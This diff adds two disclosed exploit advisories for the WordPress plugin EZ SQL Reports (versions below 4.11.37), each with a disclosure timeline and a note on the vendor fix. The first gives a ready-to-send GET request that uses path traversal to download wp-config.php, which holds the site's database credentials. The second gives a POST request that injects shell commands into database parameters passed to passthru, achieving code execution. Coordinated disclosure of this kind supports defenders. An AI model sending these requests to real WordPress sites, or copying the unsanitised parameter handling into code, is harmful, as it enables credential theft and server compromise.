@@ -1,0 +1,80 @@
+# Exploit Title: EZ SQL Reports < 4.11.37: Arbitrary File Download (admin/colaborator required)
+# Google Dork: -
+# Date: 12/09/2015
+# Exploit Author: Felipe Molina (@felmoltor)
+# Vendor Homepage: https://wordpress.org/plugins/elisqlreports/
+# Software Link: https://downloads.wordpress.org/plugin/elisqlreports.4.11.33.zip
+# Version: < 4.11.33, fixed in 4.11.37
+# Tested on: Debian GNU/Linux 7 with Wordpress 4.3
+# CVE : N/A
+#
+# Summary: The plugin allows a wordpress site administrator or
+collaborator to download arbitrary files from the host file system
+though the plugin functionality of downloading .sql, .sql.zip or
+.sql.gz files created by the wordpress administrator.
+# The file name to download is not sanitized and path traversal can be
+injected in the request.
+#
+# Timeline:
+# - 09/09/2015: Fist contact with the author
+# - 11/09/2015: Author creates fix and communicate to me
+# - 12/09/2015: Public release of the new plugin version
+
+# POC: To retrieve the wp-config.php file:
+
+GET /wp-admin/admin.php?page=ELISQLREPORTS-settings&Download_SQL_Backup=../../../wp-config.php
+HTTP/1.1
+Host: <the host with the wordpress>
+Proxy-Connection: keep-alive
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Upgrade-Insecure-Requests: 1
+User-Agent: <User-Agent>
+Referer: http://<the host with the
+wordpress>/wp-admin/admin.php?page=ELISQLREPORTS-settings
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: en-US,en;q=0.8,es;q=0.6
+Cookie: wordpress_[...etc...]4af418c3efd
+
+
+# Exploit Title: EZ SQL Reports < 4.11.37: Arbitrary Code Execution (admin/colaborator required)
+# Google Dork: -
+# Date: 12/09/2015
+# Exploit Author: Felipe Molina (@felmoltor)
+# Vendor Homepage: https://wordpress.org/plugins/elisqlreports/
+# Software Link: https://downloads.wordpress.org/plugin/elisqlreports.4.11.33.zip
+# Version: < 4.11.33, fixed in 4.11.37
+# Tested on: Debian GNU/Linux 7 with Wordpress 4.3
+# CVE : N/A
+#
+# Summary: There are several calls to "passtthru" in the code, one of
+them is receiving the username, password, database name and host from
+the $_POST arguments, so you can inject in every of this parameter the
+";" character or others like "&&" or "||" to execute other distinct
+commands to "/usr/bin/mysql"
+#
+# Timeline:
+# - 09/09/2015: Fist contact with the author
+# - 11/09/2015: Author creates fix and communicate to me
+# - 12/09/2015: Public release of the new plugin version
+
+# POC: Send a POST request like this to obtain in the folder wp-admin
+a file with name "testrce.txt". The parameters DB_NAME, DB_HOST,
+DB_USER, and DB_PASSWORD are injectable:
+
+POST /wp-admin/admin.php?page=ELISQLREPORTS-settings HTTP/1.1
+Host: <wordpress web>
+Proxy-Connection: keep-alive
+Content-Length: 177
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://<wordpress web>
+Upgrade-Insecure-Requests: 1
+User-Agent: <the user agent>
+Content-Type: application/x-www-form-urlencoded
+Referer: http://<wordpress web>/wp-admin/admin.php?page=ELISQLREPORTS-settings
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8,es;q=0.6
+Cookie: wordpress_8fa[...etc...]b7d
+
+DB_NAME=<the db
+name>%3B+touch+testrce.txt%3B+&DB_HOST=127.0.0.1&DB_USER=<theuser>&DB_PASSWORD=<thepassword>&db_date=z.2015-08-27-20-22-29.manual.wp.127.0.0.1.sql.zip&db_nonce=au78c5ff86
